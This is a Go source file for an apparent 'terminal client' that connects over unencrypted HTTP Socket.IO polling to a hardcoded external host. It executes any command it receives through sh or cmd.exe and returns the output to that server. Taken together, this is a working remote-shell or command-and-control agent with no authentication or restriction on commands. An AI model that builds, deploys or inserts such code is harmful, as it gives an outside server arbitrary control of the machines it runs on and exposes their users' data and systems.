package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Server configuration
const (
	serverHost = "umaigames.com"
	serverPort = "80"
)

// RunData represents the payload for getRunRequest/getRunResponse
type RunData struct {
	From string `json:"from"`
	To   string `json:"to"`
	Cmd  string `json:"cmd"`
}

type socketIOClient struct {
	sid      string
	roomName string
	baseURL  string
	client   *http.Client
}

func main() {
	terminalID := os.Getenv("TERMINAL_ID")
	if terminalID == "" {
		terminalID = "1"
	}
	roomName := "terminal-" + terminalID

	log.Printf("Starting Go terminal client for room %s ...\n", roomName)

	client, err := connectSocketIO(roomName)
	if err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}

	log.Println("Connected to server.")

	// Send joinToRoom immediately (minimal delay)
	time.Sleep(200 * time.Millisecond)

	joinData := map[string]string{"roomName": roomName}
	err = client.emit("joinToRoom", joinData)
	if err != nil {
		log.Fatalf("Failed to join room: %v", err)
	}
	log.Printf("Joined room: %s\n", roomName)

	// Keep process alive
	log.Println("Client is ready and listening for commands...")
	select {}
}

func connectSocketIO(roomName string) (*socketIOClient, error) {
	baseURL := fmt.Sprintf("http://%s:%s/socket.io/", serverHost, serverPort)

	// HTTP handshake with EIO=4 (Socket.IO v4)
	handshakeURL := baseURL + "?EIO=4&transport=polling"
	resp, err := http.Get(handshakeURL)
	if err != nil {
		return nil, fmt.Errorf("handshake failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read handshake response: %v", err)
	}

	bodyStr := string(body)
	log.Printf("Handshake response: %s\n", bodyStr)

	// EIO=4 format: "0{...json...}" (packet type + JSON, no length prefix)
	if len(bodyStr) < 2 || bodyStr[0] != '0' {
		return nil, fmt.Errorf("invalid handshake response")
	}

	jsonStr := bodyStr[1:]
	var handshakeData map[string]interface{}
	err = json.Unmarshal([]byte(jsonStr), &handshakeData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse handshake JSON: %v", err)
	}

	sid, ok := handshakeData["sid"].(string)
	if !ok {
		return nil, fmt.Errorf("no session ID in handshake")
	}

	log.Printf("Got session ID: %s\n", sid)

	client := &socketIOClient{
		sid:      sid,
		roomName: roomName,
		baseURL:  baseURL,
		client: &http.Client{
			Timeout: 30 * time.Second,
		},
	}

	// Start polling
	go client.pollMessages()

	// Wait for initial messages
	time.Sleep(300 * time.Millisecond)

	// Send Socket.IO connect packet (namespace "/")
	connectErr := client.sendPollingData("40")
	if connectErr != nil {
		return nil, fmt.Errorf("failed to send connect packet: %v", connectErr)
	}

	log.Println("Socket.IO connect packet sent")

	// Wait for connect confirmation
	time.Sleep(200 * time.Millisecond)

	return client, nil
}

func (c *socketIOClient) sendPollingData(data string) error {
	url := fmt.Sprintf("%s?EIO=4&transport=polling&sid=%s", c.baseURL, c.sid)

	// EIO=4 format: just the packet data, no length prefix
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(data))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "text/plain;charset=UTF-8")

	resp, err := c.client.Do(req)
	if err != nil {
		return err
	}

	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("polling POST failed: status %d, body: %s", resp.StatusCode, body)
	}

	log.Printf("POST response: %s\n", string(body))

	return nil
}

func (c *socketIOClient) emit(eventName string, data interface{}) error {
	payload := []interface{}{eventName, data}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	// Socket.IO packet: "42" + JSON
	packet := "42" + string(jsonData)
	return c.sendPollingData(packet)
}

func (c *socketIOClient) pollMessages() {
	consecutiveErrors := 0
	for {
		messages, err := c.pollOnce()
		if err != nil {
			consecutiveErrors++
			if consecutiveErrors > 5 {
				log.Printf("Poll error (too many consecutive): %v", err)
				time.Sleep(5 * time.Second)
			} else {
				time.Sleep(1 * time.Second)
			}
			continue
		}

		consecutiveErrors = 0

		for _, msg := range messages {
			c.handleMessage(msg)
		}

		time.Sleep(50 * time.Millisecond)
	}
}

func (c *socketIOClient) pollOnce() ([]string, error) {
	url := fmt.Sprintf("%s?EIO=4&transport=polling&sid=%s", c.baseURL, c.sid)

	resp, err := c.client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("polling GET failed: status %d, body: %s", resp.StatusCode, body)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	bodyStr := string(body)
	if bodyStr == "" {
		return nil, nil
	}

	// EIO=4 format: Simple concatenation of packets (no length prefix)
	// Packets: "2" (ping), "3" (pong), "40" (connect), "42[...]" (event), etc.
	messages := parseEIO4Packets(bodyStr)

	return messages, nil
}

func parseEIO4Packets(data string) []string {
	var packets []string
	remaining := data

	for len(remaining) > 0 {
		// Engine.IO packet type (single digit)
		if remaining[0] >= '0' && remaining[0] <= '6' {
			packetType := remaining[0:1]

			if packetType == "0" || packetType == "1" || packetType == "2" || packetType == "3" || packetType == "6" {
				// Simple packets (single char or single char + noop)
				packets = append(packets, packetType)
				remaining = remaining[1:]
			} else if packetType == "4" {
				// Socket.IO packet (starts with "4")
				// Look for "40", "41", "42", "43", etc.
				if len(remaining) > 1 {
					socketIOType := remaining[0:2]
					if socketIOType == "40" || socketIOType == "41" {
						// Connect/disconnect (no payload)
						packets = append(packets, socketIOType)
						remaining = remaining[2:]
					} else if socketIOType == "42" || socketIOType == "43" {
						// Event/ack (has JSON payload)
						// Find the end of JSON array
						jsonStart := 2
						if jsonStart < len(remaining) && remaining[jsonStart] == '[' {
							depth := 0
							i := jsonStart
							for i < len(remaining) {
								if remaining[i] == '[' || remaining[i] == '{' {
									depth++
								} else if remaining[i] == ']' || remaining[i] == '}' {
									depth--
									if depth == 0 {
										packets = append(packets, remaining[0:i+1])
										remaining = remaining[i+1:]
										break
									}
								}
								i++
							}
							if depth != 0 {
								// Malformed JSON, take whole remaining
								packets = append(packets, remaining)
								remaining = ""
							}
						} else {
							// No JSON, just the type
							packets = append(packets, socketIOType)
							remaining = remaining[2:]
						}
					} else {
						// Unknown Socket.IO type
						packets = append(packets, packetType)
						remaining = remaining[1:]
					}
				} else {
					packets = append(packets, packetType)
					remaining = remaining[1:]
				}
			} else {
				// Unknown packet type
				packets = append(packets, packetType)
				remaining = remaining[1:]
			}
		} else {
			// Not a valid packet start, skip
			remaining = remaining[1:]
		}
	}

	return packets
}

func (c *socketIOClient) handleMessage(message string) {
	if len(message) < 1 {
		return
	}

	log.Printf("Received: '%s'\n", message)

	// Ping
	if message == "2" {
		log.Println("Ping received, sending pong")
		c.sendPollingData("3")
		return
	}

	// Socket.IO connect response
	if message == "40" {
		log.Println("Socket.IO connected!")
		return
	}

	// Socket.IO event
	if strings.HasPrefix(message, "42") {
		payload := message[2:]
		var eventData []interface{}
		err := json.Unmarshal([]byte(payload), &eventData)
		if err != nil {
			log.Printf("Failed to parse event: %v", err)
			return
		}

		if len(eventData) < 2 {
			return
		}

		eventName, ok := eventData[0].(string)
		if !ok {
			return
		}

		log.Printf("Event: %s\n", eventName)

		if eventName == "getRunRequest" {
			c.handleGetRunRequest(eventData[1])
		}
	}
}

func (c *socketIOClient) handleGetRunRequest(data interface{}) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		log.Printf("Error marshaling data: %v", err)
		return
	}

	var runData RunData
	err = json.Unmarshal(jsonData, &runData)
	if err != nil {
		log.Printf("Error unmarshaling RunData: %v", err)
		return
	}

	log.Printf("getRunRequest: from=%s to=%s cmd=%s\n", runData.From, runData.To, runData.Cmd)

	if runData.From != c.roomName {
		log.Printf("Skipping (different terminal): %s\n", runData.From)
		return
	}

	output := runCommand(runData.Cmd)

	response := RunData{
		From: runData.From,
		To:   runData.To,
		Cmd:  output,
	}

	err = c.emit("getRunResponse", response)
	if err != nil {
		log.Printf("Failed to send response: %v", err)
	} else {
		log.Println("getRunResponse sent.")
	}
}

func runCommand(cmd string) string {
	log.Printf("Running: %s\n", cmd)

	var command *exec.Cmd
	if runtime.GOOS == "windows" {
		command = exec.Command("cmd.exe", "/C", cmd)
	} else {
		command = exec.Command("sh", "-c", cmd)
	}

	out, err := command.CombinedOutput()
	output := strings.TrimSpace(string(out))

	if err != nil {
		return fmt.Sprintf("err: %v\n%s", err, output)
	}
	if output == "" {
		return "Command executed, but no output."
	}
	return output
}
